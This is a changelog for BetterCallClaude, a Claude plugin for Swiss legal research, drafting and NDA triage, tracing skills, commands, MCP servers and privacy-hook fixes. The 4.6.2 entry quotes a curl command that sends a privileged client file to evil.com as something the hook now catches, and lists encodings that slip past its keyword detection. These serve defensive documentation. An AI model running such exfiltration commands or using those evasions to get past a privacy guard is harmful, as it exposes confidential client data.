# Changelog

All notable changes to BetterCallClaude will be documented in this file.

---

## [4.8.3] - 2026-05-25

### Fixed — MCP Tool References
- **`doctor.md`**: corrected tool probe names — `search_personas` → `legal_analyze`, `search_tas_awards` → `cas_search`, `search_decisions` for swiss-caselaw. Updated `legal-persona` description from "Profili magistrati svizzeri" to "Analisi, strategia e drafting documenti legali svizzeri".
- **`help.md`**: corrected `legal-persona` description from "Swiss judicial personas — profiles, voting patterns, doctrinal positions" to "Swiss-law document intelligence (strategy, drafting, analysis)".
- **`version.md`**: corrected `legal-persona` description.
- **`README.md`**: added missing servers (legal-persona, tas-jurisprudence, swiss-caselaw, ollama) to MCP server table; updated server counts (6 → 9).

### Added — CONNECTORS Documentation
- **`CONNECTORS.md`**: added complete sections for `legal-persona` (tools: `legal_strategy`, `legal_draft`, `legal_analyze`), `tas-jurisprudence` (tools: `cas_search`, `cas_get_award`, `cas_recent`, `cas_by_sport`), and `swiss-caselaw` (SSE, opencaselaw.ch). Updated overview table and server counts from 6 to 9.

### Added — Widget Integration Hooks
- **Adversarial Dashboard (W2)**: `adversarial-analysis` SKILL.md now checks for `present_adversarial_analysis` tool after Judicial synthesis — invokes it with structured advocate/adversary/judge data if available; falls back to full textual output if not.
- **Intake Form (W4)**: `legal-intake` SKILL.md now checks for `present_intake_form` tool in Briefing mode — renders Socratic questions as a form widget (max 1 follow-up round) if available; falls back to chat dialogue if not.
- **`compute_deadlines`**: `swiss-legal-strategy` SKILL.md now references the `compute_deadlines` tool for procedural deadline computation under ZPO/BGG/VwVG/StPO. Includes Fristberechnung rules, Gerichtsferien, and mandatory verification disclaimer. Falls back to manual calculation with disclaimer if tool unavailable.

## [4.8.2] - 2026-06-10

### Skills Consolidated (Spec D)

Skill count reduced from 15 to 12 with zero capability loss. All content migrated integrally.

| Removed Skill | Migrated To | Rationale |
|---------------|-------------|-----------|
| `output-summarization` | `/bettercallclaude:summarize` command (full content embedded) | Process step, not domain knowledge — invoked only by orchestration |
| `swiss-jurisdictions` | Routing logic → `swiss-legal-research`; canton profiles → `skills/shared/references/swiss-jurisdictions.md` (on-demand) | Already used as library, not user-activated; 686 lines of reference data freed from permanent context |
| `legal-query-refinement` | `legal-intake` (refine mode) + `legal-intake/references/refinement-workflow.md` | Merged with `legal-briefing` — same job (query → plan), different complexity modes |
| `legal-briefing` | `legal-intake` (briefing mode) | See above |

### Added
- **`legal-intake` skill**: unified intake with two modes — Refine (single-domain, ≤3 Socratic rounds) and Briefing (multi-domain, specialist panel + execution plan). Replaces both `legal-query-refinement` and `legal-briefing`.
- **`docs/audit/SKILLS-AUDIT.md`**: full inventory, token measurements, overlap mapping, consolidation decisions with rationale, before/after metrics.
- **`skills/shared/references/swiss-jurisdictions.md`**: 26 canton profiles (court hierarchies, data sources, special courts) loaded on demand.
- **Citation delegation**: `swiss-legal-translation` now explicitly delegates citation conversion to `swiss-citation-formats` (eliminated duplicated boundary explanation).

### Changed
- **All skill descriptions** trimmed to ~80 words or fewer (previously 98-167 words). Reduced permanent context tax.
- **`swiss-legal-research`**: absorbed jurisdiction resolution from `swiss-jurisdictions` — now includes federal/cantonal routing logic.
- **`swiss-legal-drafting`**: updated references from `swiss-jurisdictions` to `swiss-legal-research` + reference module.
- **`legal-5step-framework`**: Step 1 now references `swiss-legal-research` for jurisdiction resolution.
- **Commands updated**: `legal`, `federal`, `cantonal`, `refine`, `briefing`, `summarize` — all references to removed skills replaced.
- **Agents updated**: all 20 agents' skill reference lists updated to remove `swiss-jurisdictions`.
- **`help` and `version` commands**: skill list updated to 12, version bumped to 4.8.2.
- **README and plugin.json**: version bumped, skill counts updated, What's New section added.

---

## [4.8.1] - 2026-06-10

### Added
- **`/bettercallclaude:start` command**: Cowork-first onboarding — language detection, MCP connectivity check (reuses `doctor` logic), guided playbook creation through natural-language questions, profile-specific usage examples (law firm / in-house / fiduciary). Absorbs all functionality of `/setup`.
- **`/bettercallclaude:doctor` command**: MCP server diagnostics — tests each of the 9 servers with lightweight calls, reports status and user-impact in plain language (no technical jargon), suggests concrete fixes when servers are unavailable.
- **Deliverable-as-file convention** (`bcc-output/`): long outputs (memos, research, strategy, drafts, triage) are now written as files in `bcc-output/YYYY-MM-DD-<slug>/` with numbered phases and `sources.md` for citation trails. Chat shows only a 3–5 line summary. Output folder configurable in playbook. Defined once in `skills/shared/SKILL.md` and referenced by all commands.
- **Reduced mode** declared in 10 MCP-dependent skills: `swiss-legal-drafting`, `swiss-legal-strategy`, `swiss-document-analysis`, `swiss-citation-formats`, `swiss-legal-translation`, `adversarial-analysis`, `compliance-frameworks`, `data-protection-law`, `swiss-jurisdictions`. Each includes an explicit degradation table showing what works and what doesn't when MCP servers are unavailable.
- **Privacy-routing Cowork fallback**: skill-level privacy check added to `privacy-routing` SKILL.md as defense-in-depth when `PreToolUse` hook is absent. Same pattern-matching logic (strong/weak markers, file paths) applied via Claude's instruction-following.
- **Natural language flag equivalents**: `legal`, `legal-5step`, `workflow`, `briefing`, `adversarial` commands now include plain-language alternatives for all flags (e.g. "analisi breve" → `--short`, "salta il briefing" → `--skip-briefing`).
- **Output convention references** added to: `research`, `strategy`, `draft`, `adversarial`, `translate`, `doc-analyze`, `nda-triage`, `precedent`, `workflow`, `legal-5step`, `briefing`, `legal`.
- **Cowork audit matrix** (`docs/audit/COWORK-AUDIT.md`): systematic review of all 24 commands and 15 skills — terminal assumptions, output mode, overlap, Cowork compatibility, and action taken. Serves as regression register for future releases.
- **Quickstart guide** (`docs/QUICKSTART-COWORK.md`): one-page, zero-jargon guide in DE/FR/IT/EN — install, share folder, `/start`, first NDA triage. Includes mini-glossary (command, skill, MCP server, playbook).
- **Hooks verification** documented in `COWORK-AUDIT.md`: `PreToolUse` privacy hook and 5-step workflow enforcement both verified for Cowork compatibility. Skill-level fallback added as defense-in-depth.

### Changed
- **`/bettercallclaude:setup`** → deprecated alias of `/start`. Displays deprecation notice and executes `/start`. Alias remains active through v4.x, removed in v5.0.
- **README**: Cowork-first ordering — "Getting Started (Cowork Desktop)" section before advanced installation. Usage examples include law firm, in-house counsel, and fiduciary profiles. "Renamed Commands" section added.
- **`/bettercallclaude:version`**: updated to v4.8.1, shows `start` and `doctor` commands, references `/doctor` instead of `/setup` for connectivity.
- **`/bettercallclaude:help`**: added `start` and `doctor` to command table, `setup` marked as alias.
- **`/bettercallclaude:privacy`**: removed bash/CLI jargon from implementation notes (no more `cat`, `grep`, `mkdir -p` instructions).
- **Command count**: 22 → 24 (added `start`, `doctor`).

### Command Overlap Resolution (D7 Policy)
- **Policy**: one command per scope; new command absorbs old; old becomes alias with deprecation notice for v4.x; removed only at v5.0.
- **Applied**: `setup` → absorbed by `start`. All `setup` functionality (MCP connectivity check, health endpoint, backend error diagnostics) preserved in `start` + `doctor`.

---

## [4.8.0] - 2026-06-10

### Added
- **Local playbook pattern** (`bettercallclaude.local.md`): firm-specific contractual positions, risk thresholds, escalation rules, citation format, and output language. Four language templates provided (DE/FR/IT/EN) in `templates/`. Playbook search order: `.claude/bettercallclaude.local.md` → shared folder → `.claude/legal.local.md` (Anthropic compat) → Swiss defaults.
- **`/bettercallclaude:nda-triage` command**: Classify NDAs as GREEN (standard approval) / YELLOW (legal review) / RED (substantive issues) against Swiss law criteria and local playbook thresholds. Supports single file and batch (folder) mode. Swiss criteria include Art. 160 ff. OR (Konventionalstrafe), Lugano Convention (forum), zwingendes Recht (mandatory law).
- **Playbook-aware contract review**: `swiss-document-analysis` skill compares contract clauses against playbook standard positions with deviation classification (conforme / scostamento accettabile / scostamento da negoziare / inaccettabile). Redline suggestions reflect playbook positions.
- **Playbook integration in drafting**: `swiss-legal-drafting` skill applies playbook preferences for governing law, jurisdiction, liability caps, and citation format when drafting contracts.
- **Coexistence with Anthropic Legal plugin**: `legal.local.md` compatibility (permanent, no deprecation), explicit plugin boundary lines in `swiss-document-analysis` and `swiss-legal-drafting` skills.
- **Positioning section** in README with comparison table vs Anthropic Legal plugin.
- `docs/PLAYBOOK.md` — playbook pattern documentation.
- `docs/MIGRATION-FROM-ANTHROPIC-LEGAL.md` — migration and coexistence guide.
- `docs/listing-copy-en.txt` — plugin listing copy for claude.com/plugins.
- Playbook integration added to `swiss-legal-strategy` skill (escalation thresholds).

### Notes
- No MCP server changes.
- No new skills (NDA triage logic integrated into `swiss-document-analysis`).
- Command count: +1 (`/bettercallclaude:nda-triage`). Now 22 commands total.

---

## [4.7.0] - 2026-05-31

### Added
- **Plugin scope enforcement.** All 17 legal commands now include an explicit "Plugin Scope Constraint" instruction requiring that legal work (research, strategy, drafting, translation, citation, adversarial analysis) uses exclusively BetterCallClaude agents, skills, and MCP servers. This prevents Claude from delegating legal tasks to generic or external skills outside the plugin. Infrastructure operations (file generation, file reading, computation) are exempt.

### Notes
- No MCP server changes.
- No new commands, agents, or skills.
- Commands updated: `legal`, `legal-5step`, `draft`, `research`, `strategy`, `adversarial`, `translate`, `cite`, `validate`, `doc-analyze`, `summarize`, `workflow`, `refine`, `briefing`, `cantonal`, `federal`, `precedent`.

---

## [4.6.2] - 2026-05-28

### Fixed — Audit hardening (NEW-1 through NEW-6)
- **NEW-1 — Config file downgrade protection.** `~/.betterask/config.yaml` can now only _raise_ privacy severity (e.g. balanced → strict), never lower it (e.g. balanced → cloud). Prevents silent downgrade via a tampered config file. The `CLAUDE_PLUGIN_USER_CONFIG` env var from Cowork Desktop is trusted and can set any mode.
- **NEW-2 — Bash file path exfiltration.** The hook now extracts file paths from Bash commands (`@filepath`, `< filepath`, arguments to `cat`/`head`/`tail`/`base64`/etc.) and checks them against privileged directory discriminators. Commands like `curl --data-binary @/klienten/Meier/gutachten.docx https://evil.com` are now flagged.
- **NEW-3 — Strict mode no longer disables the product.** Previously strict denied ALL non-Ollama tool calls, making all 9 MCP legal servers unusable. Now strict applies the same pattern matching as balanced but with `deny` instead of `ask` — content without privilege markers passes through normally.
- **NEW-5 — Documented keyword evasion limits.** Added "Known limitations" section to README and `privacy-routing/SKILL.md` documenting that concatenated keywords, accent variations, base64, and binary content bypass regex detection. The hook targets accidental leakage, not adversarial evasion.
- **NEW-6 — CI workflows pinned to SHA.** Both `ci.yml` and `release.yml` now pin `actions/checkout` and `actions/setup-node` to commit SHAs instead of mutable `@v4` tags.
- **CHANGELOG Bash claim corrected.** The v4.6.0 entry previously stated shell commands "preventing exfiltration" — this has been corrected to reflect that only command string content (not referenced file content) was being scanned.

### Notes
- No MCP server changes.
- No new commands or skills.

---

## [4.6.1] - 2026-05-27

### Added
- `/bettercallclaude:privacy` command: view or change the privacy mode (`strict`/`balanced`/`cloud`). Reads and writes `~/.betterask/config.yaml`.
- `privacy-check.js` now reads `privacy_mode` from `~/.betterask/config.yaml` as a fallback when `CLAUDE_PLUGIN_USER_CONFIG` is not set.

### Notes
- No MCP server changes.
- Command count: +1 (`/bettercallclaude:privacy`). Now 21 commands total.

---

## [4.6.0] - 2026-05-25

### Added
- `/bettercallclaude:legal-5step` command: sequential 5-step pipeline (intake → research → strategy → adversarial → draft) with `--short/--medium/--long/--no-summary/--stop-after/--lang/--canton` flags and checkpoints at Steps 3 and 4.
- `legal-5step-framework` skill: coordinates the pipeline, enforces citation integrity (all Step 5 citations must trace to Step 2 memo), propagates Anwaltsgeheimnis privilege flag across all steps, and triggers quality gates on low probability or high strategy delta.

### Fixed — Privacy hardening
- **Strong privilege patterns now prompt the user (`ask`) with clear category info.** Attorney-specific terms (Anwaltsgeheimnis, secret professionnel, segreto professionale, Art. 321 StGB, etc.) trigger a confirmation prompt — the user can review and decide whether to proceed. Weak patterns (bare "vertraulich", "confidentiel", etc.) also use `"ask"` with discriminator gating.
- **Bash tool added to hook matcher.** `hooks.json` matcher was `Write|Edit|MultiEdit|WebFetch|mcp__.*` — `Bash` was missing despite the JS code already supporting the `command` field. Shell commands containing privilege markers in the command string are now intercepted.
- **Privacy modes implemented.** The `strict`/`balanced`/`cloud` modes described in the README and `privacy-routing` skill were documentation-only — `privacy-check.js` never read any configuration. Now reads `privacy_mode` from `CLAUDE_PLUGIN_USER_CONFIG` env var (also added to `plugin.json` `userConfig`): `strict` blocks all non-Ollama tool calls (Ollama is local, exempt), `balanced` (default) prompts for strong + weak patterns, `cloud` prompts for strong only.
- **README privacy section rewritten.** Replaced "compliance" claim with "assistive technology / additional layer of protection". Added professional disclaimer matching `privacy-routing/SKILL.md`. Mode descriptions updated to reflect actual behavior.
- **Privacy skill Hook Integration section updated** to document deny/ask distinction, Bash coverage, and mode behavior.
- **Expanded pattern coverage.** Added 14 new strong patterns:
  - DE: `Verschwiegenheitspflicht`, `Geheimhaltungspflicht`, `anwaltliche Verschwiegenheit`
  - FR: `obligation de discrétion`, `secret du mandat`, `confidentialité du mandat`
  - IT: `vincolo professionale`, `obbligo di riservatezza`, `segreto d'ufficio`
  - EN: `attorney-client privilege`, `legal professional privilege`, `solicitor-client privilege`, `privileged and confidential`
  - Legal: `Art. 622 CP`

### Notes
- No MCP server changes.
- Agent and skill count: +1 skill (legal-5step-framework). Command count: +1 (/bettercallclaude:legal-5step).

---

## [4.5.0] - 2026-05-09

### Changed
- **Skill descriptions v2 — richer trigger semantics for Cowork's auto-router.** All 14 skills' `description:` frontmatter rewritten to list concrete trigger conditions, MCP tool names by name, and explicit `Do NOT trigger for:` boundaries with cross-references to other skills. Description sizes grew from short summaries (~300 chars) to 1.5K–2.4K chars each, giving Cowork's skill router much more signal for accurate auto-activation. Example: `swiss-legal-research` description now names 5 MCPs and 14 tools and rules out citation-only / refinement-only / drafting-only / translation-only queries.
- **Skill bodies enriched alongside descriptions** (13 of 14 skill bodies modified, +411 / −146 lines across `bettercallclaude/skills/**/SKILL.md`). New body sections include: FINIG transitional period guidance and Crypto/DLT regulation reference + MCP-tools section in `compliance-frameworks` (+58 lines, 12 KB → 18 KB); explicit MCP-tool listings in `swiss-legal-research` Step 2 (+98/−41 lines); GDPR adequacy + MCP-tools section in `data-protection-law` (+36 lines); pipeline-role table and expanded competence matrix in `swiss-jurisdictions` (+48 lines); activation-and-fallback section in `adversarial-analysis` (+24 lines); rewritten Step 2 and conciliation row in `swiss-legal-strategy` (+46 lines); expanded handoff block + pipeline table in `legal-query-refinement` (+46 lines). High-level workflow shapes and agent invocations are preserved — changes are additive references and clarifications, not behavioural rewrites.
- **`legal-briefing` agent reorganised.** Same workflow + agent panel structure, more concise phrasing (net −5 lines, +123/−128 across the file).
- **`/legal` and `/briefing` intent-classification.** Routing fixes between the briefing and jurisdiction skills.

### Fixed
- **DLT-Gesetz SR attribution (`compliance-frameworks` skill).** Three places incorrectly attributed SR 950.1 to the DLT Act. SR 950.1 is FIDLEG; the DLT Act is a Mantelerlass (AS 2021 33) with no own SR number — its provisions are folded into OR (SR 220), FinfraG (SR 958.1), BankG (SR 952.0), and GwG (SR 955.0). Fix prevents `fedlex-sparql.get_article("950.1", ...)` lookups from returning FIDLEG articles when the agent intended DLT provisions.
  - Description (line 3): drop "SR 950.1", describe DLT-Gesetz as Mantelerlass amending OR/FinfraG/BankG/GwG.
  - DLT body section (line 160): drop "(SR 950.1 amends multiple acts)", state DLT Act has no own SR number (AS 2021 33), point to the four amended acts.
  - SR-numbers reference (line 253): drop the false claim that 950.1 is also DLT-Gesetz; add explicit lookup hint pointing to OR Art. 973d–973i and FinfraG Art. 73a–73u.
- **`/legal` complexity threshold metadata.** Description claimed briefing activates at complexity ≥ 5. Body actually splits at three tiers: 1–3 no briefing, 4–6 inline questions handled by `/legal` itself (NOT the skill), 7–10 invokes the legal-briefing skill (`commands/legal.md:137`). Description rewritten: "runs inline briefing for complexity 4–6, activates full briefing session when complexity ≥ 7 (via legal-briefing skill)".
- **`legal-query-refinement` handoff metadata.** Description's `Do NOT trigger for` clause said "queries that score ≥ 5 on the complexity scale". Body's handoff at line 51 only redirects when `complexity ≥ 8 OR 3+ distinct legal domains OR multi-jurisdictional` — gap at complexity 5–7 where the description told the router to skip but the body had no handoff. Description aligned with body's actual handoff condition (option a: keep single-domain clarification broad, matching the skill's own boundary clause).
- **`/version` command** hardcoded version display corrected from stale `4.3.0` (was wrong on 4.4.0 already) to `4.5.0`.
- **`/help` command** version footer corrected from stale `v4.3.0` to `v4.5.0`.

### Removed
- **Dev artifacts that shipped in 4.4.0.** The plugin no longer ships `bettercallclaude/skills/legal-briefing-workspace/` (~150 KB / 55-file eval harness with `iteration-1/`, `evals/`, `old_skill/` vs `with_skill/` benchmark JSON runs, response.md, eval_metadata.json, timing.json, grading.json). Cowork's skill scanner uses `skills/*/SKILL.md` (single wildcard) so the nested `iteration-1/skill-snapshot/SKILL.md` was never picked up — but the directory was being shipped to every user with no purpose.
- Two ad-hoc HTML review exports at the repo root (`legal-briefing-review-iteration-1.html`, `legal-briefing-trigger-eval-review.html`, ~110 KB combined).

### Added
- `.gitignore` rules to prevent the dev-artifact recurrence:
  ```
  legal-briefing-review-*.html
  legal-briefing-trigger-eval-review.html
  bettercallclaude/skills/*-workspace/
  ```

### Notes
- **No MCP server changes.** `.mcp.json` is identical to 4.4.0: 7 HTTP servers on `mcp.bettercallclaude.ch` + `swiss-caselaw` SSE on `mcp.opencaselaw.ch` + `ollama` local STDIO.
- **No skill or agent count changes.** 20 agents, 19 commands, 14 skills — same as 4.4.0. Skill body content was modified (see Changed section above) but no skill was added or removed and no agent logic was rewritten.
- **No userConfig schema changes.** Existing installs upgrade in-place without re-prompting for `ollama_host`, `default_jurisdiction`, `output_language`, or `api_token`.
- **Cowork upgrade path:** `marketplace.json` advertises `4.5.0` once this lands on `main`. Existing users will see "Update plugin" on their next marketplace Sync (manual or auto).

### Content counts
- 20 agents, 19 commands, 14 skills, 9 MCP servers in `.mcp.json` (7 remote HTTP + `swiss-caselaw` SSE + `ollama` local STDIO). Same as 4.4.0.

---

## [4.4.0] - 2026-04-21

### Changed
- **Repository split — MCP source code moved out.** All Swiss legal MCP servers (`bge-search`, `entscheidsuche`, `fedlex-sparql`, `legal-citations`, `onlinekommentar`, `legal-persona`, `tas-jurisprudence`) and the HTTP aggregator are now maintained in the separate [`fedec65/BetterCallClaudeMCP`](https://github.com/fedec65/BetterCallClaudeMCP) repo. This repo is now plugin-only: agents, commands, skills, hooks, and `.mcp.json` pointing at remote HTTPS endpoints on `mcp.bettercallclaude.ch`. End-user behaviour is unchanged for the 5 servers already remote since v4.3.0 (commit 4c5b869 hardcoded the URLs); `legal-persona` and `tas-jurisprudence` are net-new MCP surfaces in this release.
- Canonical HTTP aggregator on Railway now serves **7** MCPs (added `legal-persona` and `tas-jurisprudence` alongside the original five).

### Removed
- `mcp-servers-src/` (TypeScript source for the 5 Swiss legal MCPs that existed here, plus `ollama` and test fixtures) — legal MCP sources moved to `BetterCallClaudeMCP/mcp-servers/`; `ollama` source restored under `bettercallclaude/mcp-servers/ollama/` (still plugin-local).
- `mcp-servers-http/` (Express HTTP aggregator) — moved to `BetterCallClaudeMCP/mcp-servers-http/`.
- `scripts/build-servers.sh` (esbuild bundler) — moved with the source.
- `package.json` scripts `build`, `build:bundle`, `test` (they targeted the removed directories). `package` remains.
- CI jobs `test-mcp-servers` and `test-http-server` — those tests now run in the `BetterCallClaudeMCP` repo against the canonical source.

### Notes for maintainers
- To edit an MCP server's behaviour, open a PR in `BetterCallClaudeMCP`, merge to `main`, Railway auto-redeploys.
- This plugin repo only needs changes when editing agents, commands, skills, hooks, the local `ollama` STDIO server, or `.mcp.json` (to add/remove remote endpoints).

### Content counts
- 20 agents, 19 commands, 14 skills, 9 MCP servers in `.mcp.json` (7 remote HTTP + `swiss-caselaw` SSE + `ollama` local STDIO). Remote MCPs available at `mcp.bettercallclaude.ch`: bge-search, entscheidsuche, fedlex-sparql, legal-citations, onlinekommentar, legal-persona, tas-jurisprudence.

---

## [4.3.0] - 2026-04-20

### Fixed
- **Cowork plugin upload validation** — the v4.2.x zip was rejected by Cowork's server-side plugin validator with a generic "PLUGIN VALIDATION FAILED" toast. Binary-bisected against 11 micro-zips and fixed three distinct manifest issues:
  - `userConfig` entries in `plugin.json` now declare `type`, `title`, and `default` as required by Anthropic's Zod schema (PR #15, #21).
  - All 14 `skills/*/SKILL.md` now include the required `name:` frontmatter field (PR #21). The local `claude plugin validate` CLI does not crawl skill frontmatter, so this only surfaces on upload.
  - All 6 gateway URLs in `.mcp.json` are now hardcoded. Cowork rejects `${user_config.*}` inside `url:` fields because upload validation runs before the user is prompted for config values (see [anthropic/claude-code#39455](https://github.com/anthropics/claude-code/issues/39455)). `${user_config.*}` continues to work in `env:`, `args:`, and `headers:` blocks — `ollama_host` is still templated.
- **Privacy hook** now covers `MCP`, `MultiEdit`, and `WebFetch` tool calls (previously only `Bash`, `Edit`, `Write`). Weak markers (bare "confidential"/"vertraulich") now require a corroborating strong signal before triggering, reducing false positives on unrelated text (PR #12).
- **MCP shared code** — resolved duplicate `CacheRepository` class shipped under two files; raw-SQL variant renamed `SqliteCacheRepository` to match its filename (PR #14).
- **CI** — lint step no longer `continue-on-error`; added dedicated HTTP server build job; aligned `engines.node` and TypeScript versions across all packages (PR #16).

### Changed
- **Agent model tiers pinned explicitly** — every agent now declares `model: haiku|sonnet|opus` in its frontmatter. Previously agents defaulted silently. Haiku for fast scoped tasks (citation formatting, summarization); Sonnet for the bulk of domain reasoning; Opus reserved for judicial synthesis and workflow orchestration (PR #13).
- **Orchestrator and briefing agents** gained the `Task` tool so they can actually spawn subagents — previously they could describe workflows but not execute them (PR #13).
- **`userConfig` surface reduced** from 6 keys to 4: dropped `mcp_base_url` and `caselaw_base_url` (now hardcoded). Remaining: `ollama_host`, `default_jurisdiction`, `output_language`, `api_token`. Self-hosters who need a different gateway fork the repo and edit `.mcp.json` directly.

### Added
- `docs/PRIVACY.md` — Anwaltsgeheimnis routing architecture, data flow diagrams, and the updated self-hosting trade-off note (PR #17).
- `SECURITY.md` — responsible disclosure policy and supported-version matrix (PR #17).
- `CONTRIBUTING.md` — contributor workflow including the firm rule that `${user_config.*}` must not appear in `url:` fields of `.mcp.json` (PR #17).
- `data/README.md` — documents which files under `data/` are canonical vs. generated (PR #18).

### Removed
- Dead `install-claude-desktop.sh` (legacy CLI-era script) (PR #18).

### Content counts (unchanged from 4.2.0)
- 20 agents, 19 commands, 14 skills, 7 MCP servers (6 remote + 1 local STDIO `ollama`).

---

## [4.2.0] - 2026-04-16

### Changed
- Split Claude Code CLI into separate repository (fedec65/bettercallclaude-cli)
- This repository is now Cowork Desktop only
- Removed local stdio transport options -- HTTP transport only
- Shortened MCP server key names (dropped `bettercallclaude-` prefix)
- Added full `plugin.json` manifest at plugin root (Anthropic official format)
- Renamed `.mcp.json` to `mcp.json` (Anthropic official format)

---

## [4.1.3] - 2026-04-06

### Changed
- **Architecture refactoring**: Migrated domain methodology from 13 commands into 14 skills
- Commands now serve as thin entry points (5-13 lines) that delegate to skills
- Established single source of truth: skills contain methodology, commands provide slash-command interfaces

### Added
- **4 new skills**: `swiss-legal-translation`, `swiss-document-analysis`, `output-summarization`, `legal-query-refinement`
- Skills now total 14 (up from 10)

### Unchanged
- 6 infrastructure commands remain full-featured: `legal`, `setup`, `help`, `workflow`, `briefing`, `version`
- All 20 agents unchanged
- All 6 MCP servers unchanged

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

---

## [4.0.1] - 2026-03-11

### Fixed
- MCP servers now appear in Cowork Desktop after marketplace installation
- Switched 5 servers from STDIO to HTTP transport (`mcp.bettercallclaude.ch`)
- Cowork Desktop sandboxed VM environment cannot run STDIO-based MCP servers

### Changed
- `bettercallclaude/.mcp.json`: 5 servers use HTTP, ollama remains STDIO for privacy

## [2.2.1] - 2026-01-17

### 🪟 Windows Compatibility: Command Syntax Migration

This release fixes Windows filesystem compatibility by migrating all slash command filenames from colon (`:`) to hyphen (`-`) format.

### ⚠️ BREAKING CHANGE: Command Syntax

**All slash commands now use hyphens instead of colons:**

| Old Syntax (v2.2.0) | New Syntax (v2.2.1) |
|---------------------|---------------------|
| `/legal:research` | `/legal-research` |
| `/legal:strategy` | `/legal-strategy` |
| `/legal:draft` | `/legal-draft` |
| `/legal:federal` | `/legal-federal` |
| `/legal:cantonal` | `/legal-cantonal` |
| `/legal:cite` | `/legal-cite` |
| `/legal:help` | `/legal-help` |
| `/legal:version` | `/legal-version` |
| `/legal:routing` | `/legal-routing` |
| `/agent:researcher` | `/agent-researcher` |
| `/agent:strategist` | `/agent-strategist` |
| `/agent:drafter` | `/agent-drafter` |
| `/agent:orchestrator` | `/agent-orchestrator` |
| `/agent:compliance` | `/agent-compliance` |
| `/agent:risk` | `/agent-risk` |
| `/agent:procedure` | `/agent-procedure` |
| `/agent:fiscal` | `/agent-fiscal` |
| `/agent:corporate` | `/agent-corporate` |
| `/agent:realestate` | `/agent-realestate` |
| `/agent:translator` | `/agent-translator` |
| `/agent:cantonal` | `/agent-cantonal` |
| `/agent:citation` | `/agent-citation` |
| `/agent:data-protection` | `/agent-data-protection` |
| `/doc:analyze` | `/doc-analyze` |
| `/swiss:federal` | `/swiss-federal` |
| `/swiss:precedent` | `/swiss-precedent` |

### Why This Change?

**Windows Filesystem Restriction**: Windows reserves the colon (`:`) character for drive letter designations (e.g., `C:`). Files containing colons cannot be created or checked out on Windows systems.

**CI/CD Impact**: GitHub Actions Windows runners (`windows-2022`) failed with Git exit code 128:
```
error: invalid path '.claude/commands/agent:cantonal.md'
```

### Changed

- **26 Command Files Renamed**: All `.claude/commands/*.md` files migrated from colon to hyphen format
- **Documentation Updated**: CLAUDE.md, README.md, BETTERASK.md, command-reference.md, AGENT_ARCHITECTURE.md
- **Windows CI Restored**: PowerShell installer tests now pass on Windows

### Migration Guide

**Update your workflows and scripts:**

```bash
# Old (v2.2.0)
/legal:research "Art. 97 OR"
/agent:researcher @case.md

# New (v2.2.1)
/legal-research "Art. 97 OR"
/agent-researcher @case.md
```

**Search and replace in your code:**
- Replace `/legal:` with `/legal-`
- Replace `/agent:` with `/agent-`
- Replace `/doc:` with `/doc-`
- Replace `/swiss:` with `/swiss-`
- Replace `/case:` with `/case-`

### Backward Compatibility

⚠️ **Not Backward Compatible**: Old colon-based commands will not work after this update.

Users must update their workflows, scripts, and muscle memory to use the new hyphen-based syntax.
